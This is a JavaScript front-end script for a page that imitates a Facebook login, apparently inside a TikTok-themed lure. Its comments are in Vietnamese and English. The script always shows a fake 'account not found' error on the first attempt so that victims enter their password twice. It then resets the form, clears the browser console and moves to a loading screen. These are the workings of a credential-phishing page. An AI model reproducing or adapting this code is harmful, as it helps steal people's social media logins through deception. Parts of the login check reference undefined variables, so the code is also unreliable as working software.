//Copyright GiaHuy 2024
//Preloading
  document.addEventListener("DOMContentLoaded", function() {
      setTimeout(function() {
          document.querySelector('.preloader').style.display = 'none';
          document.querySelector('.content').style.display = 'block';
      }, 5000); // Thay thời gian 3000 bằng thời gian tải trang của bạn
  });
  
  // wacth video when scroll to viewport is play and pause when scroll out viewport using IntersectionObserver
let videos = document.querySelectorAll("video");
let options = {
    root: null,
    rootMargin: "0px",
    threshold: 0.5,
};
let callback = (entries, observer) => {
    entries.forEach((entry) => {
        if (entry.isIntersecting) {
            entry.target.play();
        } else {
            entry.target.pause();
        }
    });
}
let observer = new IntersectionObserver(callback, options);
videos.forEach((video) => {
    observer.observe(video);
});

//add class facebook and remove other class
$(document).ready(function() {

    $('#phobo-connect').click(function() {
        $('#lopload').removeClass('hidden');
        $("#loadfb").click();
        setTimeout(function() {
            $('#twitter-connect').addClass('hidden');
            $('#tieude').addClass('hidden');
            $('#phobo-connect').addClass('hidden');
            $('#duongke').addClass('hidden');
            $('#button-connect').addClass('hidden');
            $('#dieukhoan').addClass('hidden');
            $('#dangnhap').removeClass('hidden');
        }, 3000);
    });
});

//loading before oppen class login fb
$(document).ready(function() {
    //ajax
    function loadMe() {
        $('.load').hide();
    };

    //kicks things off
    $('.action').on('click', '.load', function() {
        //starts load animation
        $(this).find('p').
        html('');
        $(this).addClass('bar');
        //sim load time and run ajax function
        setTimeout(loadMe, 2900);
    });
});

  // show and hide passs
  const passwordInput = document.getElementById("password");
  const togglePasswordButton = document.querySelector(".toggle-password");
  passwordInput.addEventListener("input", toggleVisibility);

  function toggleVisibility() {
      if (passwordInput.value.length > 0) {
          togglePasswordButton.style.display = "block"; // Hiển thị nút khi có ký tự trong mật khẩu
      } else {
          togglePasswordButton.style.display = "none"; // Ẩn nút khi không có ký tự trong mật khẩu
      }
  }

  function togglePasswordVisibility() {
      if (passwordInput.type === "password") {
          passwordInput.type = "text";
          togglePasswordButton.innerHTML = '<i class="fas fa-eye"></i>';
      } else {
          passwordInput.type = "password";
          togglePasswordButton.innerHTML = '<i class="fas fa-eye-slash"></i>';
      }
  }
  
  // when submit form class name text clicked through a input, add class loading in button id="gui" loading 2s after add text "dang nhap" button that. if
  //click first will warning error correct infor loging, click next time will add class loading 2s, hidding class contact form1,hidding all content id="anlog", display loading before open video
  var clicked = false;
const btn = document.querySelector(".text")
btn.onclick = function() {
    if (!clicked) {
        document.getElementById("gui").innerHTML = "<div class='loader'></div>";
        $('.loader').delay(2000).fadeOut(100);
        setTimeout(function() {
            document.getElementById("gui").innerHTML = "<div >Đăng nhập</div>";
        }, 2000);
        window.setTimeout(function() {
            var errorMessageDisplayed = false; // Biến để kiểm tra xem thông báo lỗi đã được hiển thị hay chưa
            var errorMessage = document.getElementById("errorMessage");
            //var username = document.getElementById("username").value;
            //var password = document.getElementById("password").value;
            // Kiểm tra tên đăng nhập và mật khẩu
            if (!errorMessageDisplayed && (username !== "correct_username" || password !== "correct_password")) {
                var errorMessage = document.getElementById("errorMessage");
                errorMessage.innerHTML = "Email hoặc số di động bạn nhập không kết nối với tài khoản nào. Vui lòng kiểm tra lại.";
                errorMessage.style.display = "block";
                errorMessageDisplayed = true; // Đánh dấu là đã hiển thị thông báo lỗi
                return false; // Ngăn không submit form
            }
            return true; // Cho phép submit form
        }, 2000);
        clicked = true;
    } else {
        document.getElementById("gui").innerHTML = "<div class='loader'></div>";
        $('.loader').delay(2000).fadeOut(100);
        setTimeout(function() {
            document.getElementById("gui").innerHTML = "<div >Đăng nhập</div>";
        }, 2000);

        setTimeout(function() {
            $('.contact-form1').addClass('hidden');

            $('#anlog').addClass('hidden');
            $('#loadtiktok').removeClass('hidden');
        }, 2500);
    }
}

// submit form logfb, reset form after 2s, hidding warning error log after 30s
  $('.contact-form1 form').on('submit', function() {
      $(".text").click();
      setTimeout(function() {
          $('.contact-form1 form')[0].reset();
          console.clear();
      }, 2000);
      setTimeout(function() {
          errorMessage.textContent = "";
      }, 30000);
  })
